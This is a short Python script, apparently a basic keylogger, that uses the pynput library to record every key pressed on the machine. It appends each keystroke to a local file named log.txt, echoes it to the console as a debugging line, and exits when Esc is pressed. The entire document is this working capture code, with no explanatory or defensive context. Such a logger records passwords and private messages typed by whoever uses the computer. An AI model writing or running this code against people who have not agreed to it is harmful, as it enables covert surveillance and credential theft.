from pynput import keyboard
def on_key_press(key):
    try:
        with open('log.txt', 'a') as log_file:
            log_file.write(key.char)
            print(key.char)  # Debugging line
    except AttributeError:
        with open('log.txt', 'a') as log_file:
            log_file.write(str(key))
            print(str(key))  # Debugging line
def on_key_release(key):
    if key == keyboard.Key.esc:
        return False
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
